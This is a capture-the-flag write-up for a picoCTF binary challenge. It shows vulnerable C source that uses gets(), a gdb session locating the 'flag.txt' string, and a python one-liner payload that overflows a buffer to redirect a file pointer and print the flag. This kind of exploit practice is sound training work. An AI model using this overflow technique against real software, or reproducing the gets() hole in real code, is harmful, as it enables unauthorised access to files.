# What The Flag - 140

```
This binary uses stack cookies to prevent exploitation, but all hope is not lost. Read the flag from flag.txt anyways! The binary can be found at /home/what_the_flag/ on the shell server. You can solve this problem interactively here. The source can be found here.
```

Source:

```
#include <stdlib.h>
#include <stdio.h>

struct message_data{
    char message[128];
    char password[16];
    char *file_name;
};

void read_file(char *buf, char *file_path, size_t len){
    FILE *file;
    if(file= fopen(file_path, "r")){
        fgets(buf, len, file);
        fclose(file);
    }else{
        sprintf(buf, "Cannot read file: %s", file_path);
    }
}

int main(int argc, char **argv){
    struct message_data data;
    data.file_name = "not_the_flag.txt";

    puts("Enter your password too see the message:");
    gets(data.password);

    if(!strcmp(data.password, "1337_P455W0RD")){
        read_file(data.message, data.file_name, sizeof(data.message));
        puts(data.message);
    }else{
        puts("Incorrect password!");
    }

    return 0;
}
```

```
pico15664@shell:~$ cd /home/what_the_flag
pico15664@shell:/home/what_the_flag$ gdb -q what_the_flag
Reading symbols from what_the_flag...(no debugging symbols found)...done.
(gdb)b puts
Breakpoint 1 at 0x8048460
(gdb)x /s 0x8048777
0x8048777:	`not_the_flag.txt`
(gdb)x /s 0x804877a
(gdb) x /s 0x804877f
0x804877f:	`flag.txt`
(gdb) x /s 0x8048777
0x8048777:	`not_the_flag.txt`
(gdb) x /s 0x804877a
0x804877a:	`_the_flag.txt`
(gdb) x /s 0x804877b
0x804877b:	`the_flag.txt`
(gdb) x /s 0x804877c
0x804877c:	`he_flag.txt`
(gdb) x /s 0x804877d
0x804877d:	`e_flag.txt`
(gdb) x /s 0x804877e
0x804877e:	`_flag.txt`
(gdb) x /s 0x804877f
0x804877f:	`flag.txt`
(gdb)q
```

```
pico15664@shell:/home/what_the_flag$ ./what_the_flag
Enter your password too see the message:
1337_P455W0RD\x7f\x87\x04\x08
Incorrect password!
*** stack smashing detected ***: ./what_the_flag terminated
Aborted (core dumped)
pico15664@shell:/home/what_the_flag$ python -c "print '1337_P455W0RD\x00aa\x7f\x87\x04\x08'" |./what_the_flag
Enter your password too see the message:
Congratulations! Here is the flag: who_needs_%eip
```

```
Flag:who_needs_%eip
```





